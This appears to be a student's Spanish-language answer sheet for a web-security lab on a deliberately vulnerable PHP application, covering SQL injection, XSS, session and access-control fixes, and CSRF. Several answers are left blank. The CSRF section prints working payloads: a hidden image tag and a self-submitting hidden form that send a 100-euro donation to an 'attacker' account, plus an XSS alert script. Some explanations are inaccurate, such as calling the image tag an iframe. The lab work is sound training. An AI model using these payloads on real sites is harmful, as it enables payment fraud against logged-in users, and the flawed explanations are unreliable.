# Parte 1 - SQLi

### **A) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.**

    ![FALTA]()

### **B) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):**
### **- password**
### **- 123456**
### **- 12345678**
### **- 1234**
### **- qwerty**
### **- 12345678**
### **- dragon**

### **Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.**

    ![FALTA]()

### **C) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.**

    **Explicación del error:**

    En el código original, la consulta SQL se construye concatenando directamente los valores del usuario (`$user`) en la consulta:

    ```php
    $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
    ```

    Aunque se utiliza `SQLite3::escapeString()`, este método no es completamente seguro para prevenir ataques de inyección SQL. Un atacante podría intentar manipular la entrada para ejecutar consultas SQL maliciosas que comprometan la base de datos, lo que constituye una vulnerabilidad de **SQL Injection**.

    **Solución:**

    Para solucionar este problema, la consulta SQL debe construirse utilizando sentencias preparadas con parámetros. Las sentencias preparadas separan la consulta SQL de los datos proporcionados por el usuario, evitando así las inyecciones SQL.

    Cambiar la línea de código original:

    ```php
    $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
    ```

    Debe ser reemplazada por el siguiente código usando una sentencia preparada:

    ```php
    $stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :user');
    $stmt->bindValue(':user', $user, SQLITE3_TEXT);
    $result = $stmt->execute();
    ```

### **D) Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario `luis` (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora Candela Pacheco, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.**

### **Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo `add\_comment.php~`. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos `.php~` sino que los muestran como archivos de texto sin interpretar.**

### **Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?**

    ![FALTA]()

<br><br><br>

# Parte 2 - XSS

### **A) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.**

    **(Identifica y demuestra un ataque XSS funcional, explicando el impacto del alert.)**

    Introduzco el mensaje `<script>alert('XSS detectado');</script>`

    En el formulario de la página `show_comments.php`

### **B) Por qué dice `&amp;` cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?**

    El símbolo `&` (ampersand) en un URL se utiliza en los parámetros de una consulta GET para separar las diferentes variables o parámetros. Por ejemplo:

    ```txt
    https://example.com/donacion?cantidad=50&nombre=Juan
    ```

    En este caso, el `&` separa los parámetros `cantidad` y `nombre`.

    Sin embargo, en HTML, el símbolo `&` tiene un significado especial porque es el inicio de una **entidad de caracteres**. Para representar este símbolo de manera literal en un documento HTML, se debe usar la entidad `&amp;`. Esto asegura que el navegador interprete correctamente el `&` como un carácter y no como el comienzo de una nueva entidad HTML. Así que en un código HTML, la URL con parámetros GET debería escribirse como:

    ```txt
    https://example.com/donacion?cantidad=50&amp;nombre=Juan
    ```

    **Impacto en seguridad y usabilidad:**

    1. **Prevención de errores de interpretación**: Cuando se incluyen URLs dentro de un código HTML, si no se usan las entidades adecuadas, puede causar errores al interpretar el enlace. Por ejemplo, si un navegador encuentra `&` sin ser escapado como `&amp;`, puede interpretar incorrectamente el resto del URL o los parámetros. Esto puede resultar en problemas de carga o un comportamiento inesperado en la página web.

    2. **Inyección de código malicioso (XSS)**: Si un enlace en HTML no escapa correctamente los caracteres especiales, un atacante podría inyectar código malicioso en los parámetros de la URL. Por ejemplo, si un formulario o enlace no valida correctamente los parámetros de una URL, un atacante podría usar el `&` para insertar código JavaScript dentro de los parámetros de la URL y ejecutar un ataque de **Cross-Site Scripting (XSS)**. En este caso, el uso de `&amp;` ayuda a prevenir la ejecución de código no deseado.

    3. **Robustez en el uso de enlaces**: Al asegurarse de que los símbolos como `&` se codifiquen correctamente con entidades HTML (`&amp;`), se puede garantizar que los enlaces sean interpretados de manera coherente en diferentes navegadores y plataformas. Esto mejora la interoperabilidad y hace que la aplicación sea más confiable y segura.

### **C) Explicad cuál es el problema de `show\_comments.php`, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.**

    **Cual es el problema**
    
    El código no realiza ningún tipo de validación o sanitización de los datos recuperados de la base de datos (en este caso, los comentarios) antes de mostrarlos en la página. Específicamente:

    ```php
    echo "<div>
            <h4> ". $row['username'] ."</h4> 
            <p>commented: " . $row['body'] . "</p>
        </div>";
    ```

    El contenido de `$row['username']` y `$row['body']` proviene directamente de la base de datos y se inserta en el HTML sin procesarlo. Si un usuario malintencionado ha añadido un comentario que contiene código JavaScript (por ejemplo, `<script>alert('XSS');</script>`), este será ejecutado en el navegador de cualquier persona que visite la página.

    **Cómo arreglar el problema**

    1. **Sanitizar la salida con `htmlspecialchars`**
    - Antes de imprimir cualquier dato, escapa los caracteres especiales usando la función `htmlspecialchars` para evitar la ejecución de código JavaScript malicioso.
    - Modifica el bloque de código problemático de esta manera: (L-37/41)
        ```php
        echo "<div>
                <h4> ". htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8') ."</h4> 
                <p>commented: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') . "</p>
            </div>";
        ```

    2. **Implementar una Política de Seguridad de Contenidos (CSP)**
    - Añade encabezados HTTP que limiten la ejecución de scripts no autorizados en la página:
        ```php
        header("Content-Security-Policy: script-src 'self';");
        ```

### **D) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.**

    **Otras páginas afectadas:**  
    - **`insert_player.php`**: Afectada por XSS almacenado si los datos de entrada (como el nombre del jugador) no se validan y se muestran sin sanitización en otras páginas.
    - **`buscador.php`**: Afectada por XSS reflejado si el término de búsqueda no se valida y permite la ejecución de código malicioso cuando se muestra en los resultados.

    **Cómo lo he descubierto:**  
    He probado insertar un script malicioso (`<script>alert('XSS');</script>`) en los campos de entrada. Si el script se ejecuta al visualizar la página con los datos ingresados, la página es vulnerable a XSS.

<br><br><br>

# Parte 3 - Control de acceso, autenticación y sesiones de usuarios

### **A) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de `register.php` tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.**

    1. Se ha reemplazado el acceso directo a $_POST por filter_input() para sanitizar la entrada del usuario y trim() para eliminar espacios en blanco.
    ```php
    $username = trim(filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING));
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    ```

    2. Se ha añadido una verificación para asegurarse de que los campos no estén vacíos.
    ```php
    if (!empty($username) && !empty($password)) {
    ```

    3. Se ha reemplazado la inserción directa de SQL por una consulta preparada para prevenir inyecciones SQL.
    ```php
    $query = "INSERT INTO users (username, password) VALUES (:username, :password)";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $username, SQLITE3_TEXT);
    $stmt->bindParam(':password', $password, SQLITE3_TEXT);
    ```

    4. Se ha añadido manejo de errores y redirección segura.
    ```php
    if ($stmt->execute()) {
        header("Location: list_players.php");
        exit();
    } else {
        $error = "Error al registrar el usuario.";
    }
    ```

    5. Se ha añadido un mensaje de error en caso de que ocurra algún problema durante el registro.
    ```php
    <?php if (isset($error)): ?>
        <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
    <?php endif; ?>
    ```

    6. Se ha añadido htmlspecialchars() a la acción del formulario para prevenir XSS.
    ```php
    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
    ```

    7. Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
    ```php
    <input type="text" id="username" name="username" required>
    <input type="password" id="password" name="password" required>
    ```

    8. Se ha añadido un atributo alt a la imagen del logo para mejorar la accesibilidad.
    ```php
    <img src="images/logo-iesra-cadiz-color-blanco.png" alt="Logo">
    ```

### **B) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`**

    1. Se ha añadido el uso de sesiones en lugar de cookies para manejar la autenticación de forma más segura.
        ```php
        session_start();
        ```

    2. Se ha reemplazado la consulta SQL directa por una consulta preparada para prevenir inyecciones SQL.
    ```php
    $query = "SELECT userId, password FROM users WHERE username = :username";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $user, SQLITE3_TEXT);
    $result = $stmt->execute();
    ```

    3. Se ha implementado la verificación segura de contraseñas usando password_verify() y se almacena el userId en la sesión.
    ```php
    if (password_verify($password, $row['password'])) {
        $userId = $row['userId'];
        $_SESSION['userId'] = $userId;
        return TRUE;
    }
    ```

    4. Se ha añadido sanitización de la entrada del usuario para el nombre de usuario.
    ```php
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    ```

    5. Se ha mejorado el manejo de la autenticación exitosa, usando sesiones y redireccionando de forma segura.
    ```php
    if (areUserAndPasswordValid($username, $password)) {
        $_SESSION['user'] = $username;
        header("Location: index.php");
        exit();
    }
    ```

    6. Se ha mejorado el proceso de cierre de sesión, destruyendo la sesión y redireccionando de forma segura.
    ```php
    if (isset($_POST['Logout'])) {
        session_destroy();
        header("Location: index.php");
        exit();
    }
    ```

    7. Se ha añadido escape de salida para prevenir XSS en los mensajes de error.
    ```php
    <?= htmlspecialchars($error) ?>
    ```

    8. Se ha añadido escape de salida en la acción del formulario para prevenir XSS.
    ```php
    <form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="post">
    ```

    9. Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
    ```php
    <input type="text" id="username" name="username" required><br>
    <input type="password" id="password" name="password" required><br>
    ```

### **C) Volvemos a la página de `register.php`, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.**

    1. Restringir el acceso solo a administradores:

    Podemos modificar el archivo register.php para verificar si el usuario actual tiene permisos de administrador antes de permitir el acceso. Aquí está cómo podríamos implementarlo:

    ```php
    <?php
    session_start();
    require_once dirname(__FILE__) . '/private/conf.php';

    // Verificar si el usuario está autenticado y es administrador
    if (!isset($_SESSION['user']) || !isAdmin($_SESSION['user'])) {
        header("Location: index.php");
        exit();
    }

    // Resto del código de register.php
    ```

    2. Implementar una función isAdmin() en conf.php:

    ```php
    function isAdmin($username) {
        global $db;
        $query = "SELECT is_admin FROM users WHERE username = :username";
        $stmt = $db->prepare($query);
        $stmt->bindParam(':username', $username, SQLITE3_TEXT);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        return isset($row['is_admin']) && $row['is_admin'] == 1;
    }
    ```

    3. Modificar la estructura de la base de datos:

    Añadir una columna 'is_admin' a la tabla 'users' para identificar a los administradores:

    ```sql
    ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0;
    ```

    4. Crear una página de error personalizada:

    Crear un archivo error.php para redirigir a los usuarios no autorizados:

    ```php
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Acceso Denegado</title>
    </head>
    <body>
        <h1>Acceso Denegado</h1>
        <p>No tienes permiso para acceder a esta página.</p>
        <a href="index.php">Volver a la página principal</a>
    </body>
    </html>
    ```

    5. Actualizar la redirección en register.php:

    ```php
    if (!isset($_SESSION['user']) || !isAdmin($_SESSION['user'])) {
        header("Location: error.php");
        exit();
    }
    ```

### **D) Al comienzo de la práctica hemos supuesto que la carpeta `private` no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?**

    **(Analiza completamente la situación e implementa medidas efectivas para proteger la carpeta private.)**

    La condición de que la carpeta `private` no sea accesible no se cumple en un entorno local por defecto.

    Para evitar este acceso no autorizado y mejorar la seguridad, se pueden tomar las siguientes medidas:

    1. Encriptación los archivos de la carpeta: 
    Los archivos que estan dentro de la carpeta `private` podrían estar encriptados. Solo se desencriptarían dentro del contenedor en tiempo de ejecución usando una clave. 
    
    El gran problema que tendria este metodo, es que la clave para desencriptar los archivos debe estar disponible en algún lugar para que el contenedor pueda funcionar correctamente, por lo que el usuario podria coger esa clave, y desencriptar los archivos.


    2. Uso de imágenes pre-construidas:
    En lugar de proporcionar los archivos fuente y el docker compose para levantar la web, podría proporcionar una imagen Docker ya construida, lo que dificultaría el acceso a los archivos internos. 

    Esto no es una solución completamente segura, aunque sí dificulta el acceso a los archivos internos en comparación con proporcionar los archivos fuente directamente.

### **E) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.**

Basándonos en la información proporcionada, parece que hay varias áreas donde la seguridad de la sesión del usuario podría mejorarse. Aquí están los problemas identificados y las acciones recomendadas para implementar:

**Problemas de seguridad**

1. Uso de cookies para almacenar credenciales: El código actual almacena el nombre de usuario y la contraseña en cookies, lo cual es extremadamente inseguro[5].

2. Falta de regeneración de ID de sesión: No se está utilizando session_regenerate_id() después de un inicio de sesión exitoso[1][4].

3. Configuración de cookies de sesión: No se están configurando parámetros importantes de las cookies de sesión como HttpOnly y SameSite[1].

4. Falta de validación adicional: No se está realizando una validación adicional del usuario más allá del ID de sesión[7].

    **Acciones recomendadas**

    1. Eliminar el almacenamiento de credenciales en cookies:
    ```php
    // Eliminar estas líneas
    $_COOKIE['user'] = $_POST['username'];
    $_COOKIE['password'] = $_POST['password'];
    ```

    2. Implementar regeneración de ID de sesión:
    ```php
    if (areUserAndPasswordValid($username, $password)) {
        session_regenerate_id(true);
        $_SESSION['user'] = $username;
        // ... resto del código
    }
    ```

    3. Configurar cookies de sesión de forma segura:
    ```php
    session_set_cookie_params([
        'lifetime' => 0,
        'path' => '/',
        'domain' => '',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Lax'
    ]);
    session_start();
    ```

    4. Añadir validación adicional:
    ```php
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
    
    // En cada página que requiera autenticación
    if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT'] || 
        $_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
        // Posible intento de suplantación, destruir la sesión
        session_destroy();
        header("Location: login.php");
        exit();
    }
    ```

    5. Habilitar el modo estricto de sesiones:
    ```php
    ini_set('session.use_strict_mode', 1);
    ```

    6. Forzar el uso de cookies para las sesiones:
    ```php
    ini_set('session.use_only_cookies', 1);
    ```

<br><br><br>

# Parte 4 - Servidores web

### **¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?**

    ![FALTA]()

<br><br><br>

# Parte 5 - CSRF

### **A) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.**

    En el campo `Team` dentro de la web `insert_player.php` añadimos el siguente codigo HTML para agregar un boton que nos lleve a la pagina web preparada.

    Codigo a añadir:

    <a href="http://web.pagos/donate.php?amount=100&receiver=attacker" style="text-decoration: none;">
        <button>Profile</button>
    </a>

### **B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**

    Añadimos un codigo malicios en los comentarios de los jugadores

    ```html
    <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
    ```
    Este código crea un iframe invisible que carga silenciosamente la página de donación especificada cuando el comentario es mostrado, sin alterar la experiencia visual del usuario ni requerir ninguna interacción. El iframe, al tener dimensiones de cero y sin bordes, permanece completamente oculto en la página de comentarios.


### **C) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.**

### **Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).**

    - Sesión activa: Si el sistema web.pagos requiere que los usuarios estén logueados para realizar cualquier tipo de transacción (como una donación), será necesario que el navegador del usuario ya tenga una cookie de sesión activa que permita autenticarlo. Esto es lo que permite identificar al usuario y asociarlo con su cuenta.

    - Transacción entre usuarios registrados: Al ser un sistema de pagos entre usuarios registrados, web.pagos utilizará la cookie de sesión o un token de autenticación para identificar a quien está haciendo la donación y deducir el dinero de su cuenta. Este es el paso clave: la transacción solo puede ocurrir si el usuario tiene una cuenta registrada y activa dentro de web.pagos.

    - Verificación de usuario: Si el usuario está logueado en la plataforma, el ataque será exitoso, ya que la donación se efectuará desde la cuenta del usuario víctima (que está visualizando el comentario o interactuando con el botón malicioso). Si el usuario no está logueado o no tiene una sesión activa, el ataque fallará, porque web.pagos no podrá deducir los 100€ de su cuenta.

### **D) Si web.pagos modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.**

    Cambiar el método de GET a POST en donate.php no blindaría completamente la página contra ataques XSS. Aunque dificulta el ataque, aún es posible realizar un ataque equivalente utilizando JavaScript para enviar una solicitud POST. Aquí hay un ejemplo de cómo se podría realizar un ataque similar usando POST:

    ```bash
    <img src="x" onerror="
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://web.pagos/donate.php';
    form.style.display = 'none';
    
    var amountInput = document.createElement('input');
    amountInput.type = 'hidden';
    amountInput.name = 'amount';
    amountInput.value = '100';
    form.appendChild(amountInput);
    
    var receiverInput = document.createElement('input');
    receiverInput.type = 'hidden';
    receiverInput.name = 'receiver';
    receiverInput.value = 'attacker';
    form.appendChild(receiverInput);
    
    document.body.appendChild(form);
    form.submit();
    " style="display:none;">
    ```

    Este código crea un formulario oculto con los parámetros "amount" y "receiver", y lo envía automáticamente cuando se carga el comentario, simulando una solicitud POST a la página de donación.
